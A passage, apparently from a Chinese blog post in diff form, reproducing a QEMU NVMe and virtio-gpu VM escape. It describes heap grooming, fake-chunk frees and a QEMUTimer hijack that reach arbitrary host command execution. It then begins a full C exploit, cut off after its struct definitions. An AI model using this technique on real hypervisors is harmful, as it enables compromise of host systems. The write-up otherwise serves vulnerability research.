+<li>创建一个sq ，在nvme_init_sq函数中有<code>sq-&gt;io_req = g_new(NvmeRequest, sq-&gt;size)</code>，申请堆内存的大小为<code>0xa0 * sq-&gt;size</code>，将之前释放的mapping table重新得到。</li>
+<li>伪造chunk大小为0x290，通过漏洞函数直接释放掉虚拟机的内存，在伪造chunk的fd区域可以泄漏堆地址。</li>
+<li>接下来去泄漏qemu中分配给虚拟机内存，通过virtqueue_split_pop函数中的<code>elem = virtqueue_alloc_element(sz, out_num, in_num)</code>可以得到伪造的chunk，virtqueue_split_pop函数中的dma_memory_map就可以在伪造的chunk中写入相应地址。</li>
+<li>和之前一样继续构造mapping table，伪造chunk大小为0x40，使用漏洞函数释放虚拟机的内存；仍然是创建一个sq ，在nvme_init_sq中有<code>sq-&gt;timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, nvme_process_sq, sq)</code>创建时间函数，timer就是使用0x40大小的chunk，从而使用伪造的chunk。</li>
+<li>伪造的chunk中存在一个QEMUTimer结构体，可以泄漏nvme_process_sq函数地址得到qemu的基地址，最后修改cb和opaque就能实现任意命令执行。</li>
+</ol>
+<p>​                    </p>
+<p>这里有个自己刚开始复现时忽视的问题：在nvme_map_prp中进入qemu_iovec_init函数后通过<code>g_new(struct iovec, alloc_hint)</code>申请堆块，申请的大小跟alloc_hint有关；如果申请的chunk也正好是0x40大小，在最后伪造chunk大小为0x40释放以后，由于之前已经被qemu_iovec_init函数申请了一个，0x40的tcache数量就会减1，伪造的chunk就会进入0x40的tcache中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_map_prp</span><span class="hljs-params">(QEMUSGList *qsg, QEMUIOVector *iov, <span class="hljs-type">uint64_t</span> prp1,</span><br><span class="hljs-params">                             <span class="hljs-type">uint64_t</span> prp2, <span class="hljs-type">uint32_t</span> len, NvmeCtrl *n)</span><br>&#123;<br>    hwaddr trans_len = n-&gt;page_size - (prp1 % n-&gt;page_size);<br>    trans_len = MIN(len, trans_len);<br>    <span class="hljs-type">int</span> num_prps = (len &gt;&gt; n-&gt;page_bits) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!prp1)) &#123;<br>        trace_nvme_err_invalid_prp();<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n-&gt;cmbsz &amp;&amp; prp1 &gt;= n-&gt;ctrl_mem.addr &amp;&amp;<br>               prp1 &lt; n-&gt;ctrl_mem.addr + int128_get64(n-&gt;ctrl_mem.size)) &#123;<br>        qsg-&gt;nsg = <span class="hljs-number">0</span>;<br>        qemu_iovec_init(iov, num_prps);<br>        qemu_iovec_add(iov, (<span class="hljs-type">void</span> *)&amp;n-&gt;cmbuf[prp1 - n-&gt;ctrl_mem.addr], trans_len);<br>    &#125;<br>    ………………<br>    ………………<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_iovec_init</span><span class="hljs-params">(QEMUIOVector *qiov, <span class="hljs-type">int</span> alloc_hint)</span><br>&#123;<br>    qiov-&gt;iov = g_new(<span class="hljs-keyword">struct</span> iovec, alloc_hint);<br>    qiov-&gt;niov = <span class="hljs-number">0</span>;<br>    qiov-&gt;nalloc = alloc_hint;<br>    qiov-&gt;size = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是QEMUTimer结构体是由calloc申请的，不会从tcache中取出chunk，只要设置好nvme_map_prp函数中len，接下来调用qemu_iovec_init中的<code>g_new(struct iovec, alloc_hint)</code>可以避免上述情况</p>
+<img src="/img/22/Screenshot 2023-10-18 123922.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />
+
+<p>​                             </p>
+<p>说这个有什么用？因为我一开始nvme_map_prp函数的len参数没设置好，就出现上面这种情况，而且当时我并没有看出问题出在哪。</p>
+<p>当时我还针对这种情况想了一个方法去完成利用：伪造chunk的大小为0x50，释放以后进入0x50大小的fastbin，利用nvme_init_sq函数中的<code>sq-&gt;io_req = g_new(NvmeRequest, sq-&gt;size)</code>实现一个大size的堆分配，伪造的chunk进入0x50大小的small bin，先前堆喷已经将0x40大小的small bin清空，calloc申请QEMUTimer结构体将由0x50大小的small bin提供</p>
+<img src="/img/22/Screenshot 2023-10-18 135401.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" />
+
+<p>调用完timer_new_ns后就可以照常利用了</p>
+<img src="/img/22/Screenshot 2023-10-18 135521.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>这里不直接让伪造的chunk进入unsorted bin是因为<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L4311">free函数</a>会对chunk的地址进行判断：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>		  &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>		  &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>))<br>malloc_printerr (<span class="hljs-string">&quot;double free or corruption (out)&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>后来仔细看了qemu_iovec_init函数才明白问题出在哪。把相应参数设置好以后完全不用怎么麻烦，当然最后也要保证0x40的tcache的数量为7，如果不够就释放一些sq或者cq，保证伪造的chunk释放后进入到fastbin。</p>
+<p>​            </p>
+<p>完整exp:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> *mmio_nvme;<br><span class="hljs-type">void</span> *mmio_gpu;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">void</span> *nvme_buf;<br><span class="hljs-type">void</span> *desc_buf;<br><span class="hljs-type">size_t</span> *payload_buf;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingDesc</span> *<span class="hljs-title">desc</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingAvail</span> *<span class="hljs-title">avail</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCmd</span> *<span class="hljs-title">nvme_cmd</span>;</span> <br><span class="hljs-type">int</span> sq_tail = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> vq_last_avail_idx = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> exec_cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCmd</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     fuse;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    nsid;<br>    <span class="hljs-type">uint64_t</span>    res1;<br>    <span class="hljs-type">uint64_t</span>    mptr;<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    prp2;<br>    <span class="hljs-type">uint32_t</span>    cdw10;<br>    <span class="hljs-type">uint32_t</span>    cdw11;<br>    <span class="hljs-type">uint32_t</span>    cdw12;<br>    <span class="hljs-type">uint32_t</span>    cdw13;<br>    <span class="hljs-type">uint32_t</span>    cdw14;<br>    <span class="hljs-type">uint32_t</span>    cdw15;<br>&#125; NvmeCmd;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCreateCq</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    rsvd1[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    rsvd8;<br>    <span class="hljs-type">uint16_t</span>    cqid;<br>    <span class="hljs-type">uint16_t</span>    qsize;<br>    <span class="hljs-type">uint16_t</span>    cq_flags;<br>    <span class="hljs-type">uint16_t</span>    irq_vector;<br>    <span class="hljs-type">uint32_t</span>    rsvd12[<span class="hljs-number">4</span>];<br>&#125; NvmeCreateCq;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeCreateSq</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    rsvd1[<span class="hljs-number">5</span>];<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    rsvd8;<br>    <span class="hljs-type">uint16_t</span>    sqid;<br>    <span class="hljs-type">uint16_t</span>    qsize;<br>    <span class="hljs-type">uint16_t</span>    sq_flags;<br>    <span class="hljs-type">uint16_t</span>    cqid;<br>    <span class="hljs-type">uint32_t</span>    rsvd12[<span class="hljs-number">4</span>];<br>&#125; NvmeCreateSq;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeRwCmd</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    nsid;<br>    <span class="hljs-type">uint64_t</span>    rsvd2;<br>    <span class="hljs-type">uint64_t</span>    mptr;<br>    <span class="hljs-type">uint64_t</span>    prp1;<br>    <span class="hljs-type">uint64_t</span>    prp2;<br>    <span class="hljs-type">uint64_t</span>    slba;<br>    <span class="hljs-type">uint16_t</span>    nlb;<br>    <span class="hljs-type">uint16_t</span>    control;<br>    <span class="hljs-type">uint32_t</span>    dsmgmt;<br>    <span class="hljs-type">uint32_t</span>    reftag;<br>    <span class="hljs-type">uint16_t</span>    apptag;<br>    <span class="hljs-type">uint16_t</span>    appmask;<br>&#125; NvmeRwCmd;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">NvmeDeleteQ</span> &#123;</span><br>    <span class="hljs-type">uint8_t</span>     opcode;<br>    <span class="hljs-type">uint8_t</span>     flags;<br>    <span class="hljs-type">uint16_t</span>    cid;<br>    <span class="hljs-type">uint32_t</span>    rsvd1[<span class="hljs-number">9</span>];<br>    <span class="hljs-type">uint16_t</span>    qid;<br>    <span class="hljs-type">uint16_t</span>    rsvd10;<br>    <span class="hljs-type">uint32_t</span>    rsvd11[<span class="hljs-number">5</span>];<br>&#125; NvmeDeleteQ;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingAvail</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint16_t</span> flags;<br>  <span class="hljs-type">uint16_t</span> idx;<br>  <span class="hljs-type">uint16_t</span> ring[];<br>&#125;VRingAvail;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingDesc</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint32_t</span> len;<br>    <span class="hljs-type">uint16_t</span> flags;<br>    <span class="hljs-type">uint16_t</span> next;<br>&#125; VRingDesc;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_ctrl_hdr</span> &#123;</span><br>	<span class="hljs-type">uint32_t</span> type;<br>	<span class="hljs-type">uint32_t</span> flags;<br>	<span class="hljs-type">uint64_t</span> fence_id;<br>	<span class="hljs-type">uint32_t</span> ctx_id;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_ctrl_hdr</span> <span class="hljs-title">hdr</span>;</span><br>	<span class="hljs-type">uint32_t</span> resource_id;<br>	<span class="hljs-type">uint32_t</span> nr_entries;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_create_2d</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_ctrl_hdr</span> <span class="hljs-title">hdr</span>;</span><br>	<span class="hljs-type">uint32_t</span> resource_id;<br>	<span class="hljs-type">uint32_t</span> format;<br>	<span class="hljs-type">uint32_t</span> width;<br>	<span class="hljs-type">uint32_t</span> height;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> &#123;</span><br>	<span class="hljs-type">uint64_t</span> addr;<br>	<span class="hljs-type">uint32_t</span> length;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">NvmeAdminCommands</span> &#123;</span><br>    NVME_ADM_CMD_DELETE_SQ      = <span class="hljs-number">0x00</span>,<br>    NVME_ADM_CMD_CREATE_SQ      = <span class="hljs-number">0x01</span>,<br>    NVME_ADM_CMD_GET_LOG_PAGE   = <span class="hljs-number">0x02</span>,<br>    NVME_ADM_CMD_DELETE_CQ      = <span class="hljs-number">0x04</span>,<br>    NVME_ADM_CMD_CREATE_CQ      = <span class="hljs-number">0x05</span>,<br>    NVME_ADM_CMD_IDENTIFY       = <span class="hljs-number">0x06</span>,<br>    NVME_ADM_CMD_ABORT          = <span class="hljs-number">0x08</span>,<br>    NVME_ADM_CMD_SET_FEATURES   = <span class="hljs-number">0x09</span>,<br>    NVME_ADM_CMD_GET_FEATURES   = <span class="hljs-number">0x0a</span>,<br>    NVME_ADM_CMD_ASYNC_EV_REQ   = <span class="hljs-number">0x0c</span>,<br>    NVME_ADM_CMD_ACTIVATE_FW    = <span class="hljs-number">0x10</span>,<br>    NVME_ADM_CMD_DOWNLOAD_FW    = <span class="hljs-number">0x11</span>,<br>    NVME_ADM_CMD_FORMAT_NVM     = <span class="hljs-number">0x80</span>,<br>    NVME_ADM_CMD_SECURITY_SEND  = <span class="hljs-number">0x81</span>,<br>    NVME_ADM_CMD_SECURITY_RECV  = <span class="hljs-number">0x82</span>,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">NvmeIoCommands</span> &#123;</span><br>    NVME_CMD_FLUSH              = <span class="hljs-number">0x00</span>,<br>    NVME_CMD_WRITE              = <span class="hljs-number">0x01</span>,<br>    NVME_CMD_READ               = <span class="hljs-number">0x02</span>,<br>    NVME_CMD_WRITE_UNCOR        = <span class="hljs-number">0x04</span>,<br>    NVME_CMD_COMPARE            = <span class="hljs-number">0x05</span>,<br>    NVME_CMD_WRITE_ZEROS        = <span class="hljs-number">0x08</span>,<br>    NVME_CMD_DSM                = <span class="hljs-number">0x09</span>,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_STATUS	20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_SELECT	22</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_SIZE	24</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_ENABLE	28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_DESCLO	32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_DESCHI	36</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_AVAILLO	40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_PCI_COMMON_Q_AVAILHI	44</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VRING_DESC_F_NEXT       1</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> 